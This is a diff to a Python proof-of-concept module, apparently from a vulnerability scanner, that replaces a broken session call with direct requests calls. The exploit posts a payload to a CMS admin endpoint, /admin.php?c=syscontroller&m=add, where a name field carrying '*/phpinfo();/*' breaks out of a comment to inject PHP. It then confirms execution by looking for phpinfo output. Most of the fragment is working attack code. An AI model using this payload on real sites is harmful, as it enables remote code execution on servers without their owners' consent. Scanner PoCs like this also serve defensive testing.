@@ -50,7 +50,6 @@ class Poc(ABPoc):
 
             # 先注册一个帐号并登录，然后访问：
             # 获取cookies
-            s = requests.requests()
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
@@ -61,10 +60,10 @@ class Poc(ABPoc):
             payload = "/admin.php?c=syscontroller&m=add&post=1"
             data = "data%5Bname%5D=myndtt*/phpinfo();/*&data%5Bcname%5D=myndtt&app=0&data%5Btype%5D%5B%5D=0&data%5Bmeta_title%5D=1234&data%5Bmeta_keywords%5D=123&data%5Bmeta_descrintion%5D=123"
             url = self.target + payload
-            s.post(url, cookies=cookies, data=data)
+            requests.post(url, cookies=cookies, data=data)
 
             verify_url = self.target + '/index.php?c=myndtt&m=index'
-            r = s.get(verify_url)
+            r = requests.get(verify_url)
 
             if 'PHP Version' in r.text and 'System' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
